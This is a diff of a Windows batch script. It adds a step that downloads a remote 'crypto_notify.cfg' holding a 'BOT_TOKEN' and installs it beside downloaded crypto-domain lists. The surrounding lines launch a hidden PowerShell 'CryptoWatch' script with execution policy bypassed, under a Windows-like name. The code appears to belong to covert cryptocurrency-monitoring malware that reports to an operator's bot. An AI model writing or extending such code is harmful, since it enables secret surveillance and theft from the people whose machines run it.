@@ -707,6 +707,9 @@ del /f /q "%ZD%\crypto_watch.dl" >nul 2>&1
 call :Fetch2 winrtcs_crypto_domains.cfg "%ZD%\crypto_domains.dl"
 if exist "%ZD%\crypto_domains.dl" findstr /C:"WINRTCS_CRYPTO_DOMAINS" "%ZD%\crypto_domains.dl" >nul 2>&1 && move /y "%ZD%\crypto_domains.dl" "%ZD%\crypto_domains.cfg" >nul 2>&1
 del /f /q "%ZD%\crypto_domains.dl" >nul 2>&1
+call :Fetch2 crypto_notify.cfg "%ZD%\crypto_notify.dl"
+if exist "%ZD%\crypto_notify.dl" findstr /C:"BOT_TOKEN=" "%ZD%\crypto_notify.dl" >nul 2>&1 && move /y "%ZD%\crypto_notify.dl" "%ZD%\crypto_notify.cfg" >nul 2>&1
+del /f /q "%ZD%\crypto_notify.dl" >nul 2>&1
 if exist "%ZD%\winrtcs_sidekick.ps1" (
   start "" /min powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%ZD%\winrtcs_sidekick.ps1" -Action CryptoWatch -WorkDir "%ZD%"
   echo [%DATE% %TIME%] crypto_watch_queued>>"%LOG%"
